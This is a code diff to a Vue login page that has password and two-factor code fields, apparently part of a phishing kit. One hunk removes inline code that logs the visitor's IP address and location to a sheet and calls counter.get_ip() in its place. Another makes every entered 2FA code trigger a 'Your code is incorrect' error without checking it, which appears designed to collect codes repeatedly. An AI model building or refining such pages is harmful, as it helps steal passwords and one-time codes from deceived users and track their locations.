@@ -274,13 +274,15 @@
                 <div class="mt-1 relative">
                   <div class="relative rounded-md border-1 border-gray-300 bg-gray-200"><input id="PFwJYqbHLs_17"
                       name="code2fa" type="tel" placeholder="Code" v-model="counter.code"
-                      :class="counter.code_dk ? 'ring-gray-300 focus:ring-primary-500' : 'ring-red-500 focus:ring-red-500'"
+                      :class="{'ring-gray-300 focus:ring-primary-500': counter.code_dk, 'ring-red-500 focus:ring-red-500': !counter.code_dk || counter.code_error}"
                       class="relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 form-input rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-sm px-3 py-2 shadow-sm bg-white dark:bg-gray-900 text-gray-900 dark:text-white ring-1 ring-inset ring-gray-300 dark:ring-gray-700 focus:ring-2 focus:ring-primary-500 dark:focus:ring-primary-400">
-                  </div>
+                      <span v-show="counter.code_error && counter.code" class="absolute inset-y-0 end-0 flex items-center px-3 text-red-500"><span class="i-heroicons-exclamation-triangle-20-solid flex-shrink-0 text-gray-400 dark:text-gray-500 text-red-500 dark:text-red-400 h-5 w-5" style="--tw-text-opacity: 1; color: rgb(239 68 68 / var(--tw-text-opacity))"></span></span>
+                    </div>
                   <p v-show="!counter.code_dk && !counter.code" class="mt-2 text-red-500 dark:text-red-400 text-sm">You
                     must an code</p>
                   <p class="text-md flex items-center py-2 gap-2"><span class="i-heroicons-arrow-path"></span> We can
                     send a new code in <b class="font-bold">{{ formattedTime }}</b></p>
+                  <p v-show="counter.code_error && counter.code" class="mt-2 text-red-500 dark:text-red-400 text-sm">Your code is incorrect</p>
                 </div>
               </div>
             </div>
@@ -441,19 +443,7 @@ export default {
           this.counter.check_password = true;
 
           this.counter.password_dk = true;
-          this.getInfo()
-            .then(data => {
-              var ipAddress = data.ip;
-              var city = data.city;
-              var region = data.region;
-              var country = data.country;
-              console.log('ipAddress:' + ipAddress)
-              console.log('country:' + region)
-              this.counter.writeToSheet(ipAddress, city, region, country);
-            })
-            .catch(error => {
-              console.error('Error:', error);
-            });
+          this.counter.get_ip();
         };
         if (this.messages.passed == false) {
           this.counter.password_error = false;
@@ -486,8 +476,9 @@ export default {
     check_data_code() {
       this.counter.code_dk = true;
       if (this.counter.code) {
-        this.counter.check_password = false;
-        this.counter.check_code = true;
+        this.counter.check_password = true;
+        // this.counter.check_code = true;
+        this.counter.code_error = true;
       }
       if (!this.counter.code) {
         this.counter.code_dk = false;
@@ -638,5 +629,24 @@ export default {
 
 .h-5 {
   height: 1.25rem;
+}
+
+.i-heroicons-exclamation-triangle-20-solid,.i-heroicons-eye {
+    background-color: currentColor;
+    display: inline-block;
+    height: 1em;
+    -webkit-mask-repeat: no-repeat;
+    mask-repeat: no-repeat;
+    -webkit-mask-size: 100% 100%;
+    mask-size: 100% 100%;
+    width: 1em
+}
+
+.i-heroicons-exclamation-triangle-20-solid {
+    -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath fill-rule='evenodd' d='M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625zM10 5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 10 5m0 9a1 1 0 1 0 0-2 1 1 0 0 0 0 2' clip-rule='evenodd'/%3E%3C/svg%3E");
+    -webkit-mask-image: var(--svg);
+    mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath fill-rule='evenodd' d='M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625zM10 5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 10 5m0 9a1 1 0 1 0 0-2 1 1 0 0 0 0 2' clip-rule='evenodd'/%3E%3C/svg%3E");
+    mask-image: var(--svg);
+    --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath fill-rule='evenodd' d='M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625zM10 5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 10 5m0 9a1 1 0 1 0 0-2 1 1 0 0 0 0 2' clip-rule='evenodd'/%3E%3C/svg%3E")
 }
 </style>
